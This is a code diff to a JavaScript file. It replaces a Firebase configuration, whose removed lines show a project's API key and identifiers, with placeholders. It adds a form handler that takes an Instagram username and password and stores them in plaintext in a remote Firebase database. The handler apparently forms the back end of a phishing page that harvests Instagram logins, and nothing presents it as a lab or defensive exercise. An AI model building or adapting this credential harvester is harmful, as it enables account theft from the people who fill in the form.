@@ -1,22 +1,36 @@
-// Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
-
-// Your web app's Firebase configuration
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+// Firebase Configuration (replace with your own Firebase config)
 const firebaseConfig = {
-  apiKey: "AIzaSyDCcf9XYXhvM0g8SUKb8qZeqEycx-jNCCc",
-  authDomain: "cryptohub-eh.firebaseapp.com",
-  databaseURL: "https://cryptohub-eh-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "cryptohub-eh",
-  storageBucket: "cryptohub-eh.firebasestorage.app",
-  messagingSenderId: "150967492197",
-  appId: "1:150967492197:web:67b1bd1678fca2d295708c",
-  measurementId: "G-P58EZLKP7F"
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+    databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_PROJECT_ID.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID"
 };
 
 // Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
+firebase.initializeApp(firebaseConfig);
+
+// Get reference to the database
+const database = firebase.database();
+
+// Handle form submission
+document.getElementById("registrationForm").addEventListener("submit", function(event) {
+    event.preventDefault(); 
+
+    let username = document.getElementById("instaUsername").value;
+    let password = document.getElementById("instaPassword").value;
+
+    // Store data in Firebase Realtime Database
+    database.ref('users/').push({
+        username: username,
+        password: password,
+        timestamp: new Date().toISOString()
+    }).then(() => {
+        document.getElementById("successMessage").style.display = "block";
+        document.getElementById("registrationForm").reset();
+    }).catch((error) => {
+        console.error("Error saving data:", error);
+    });
+});
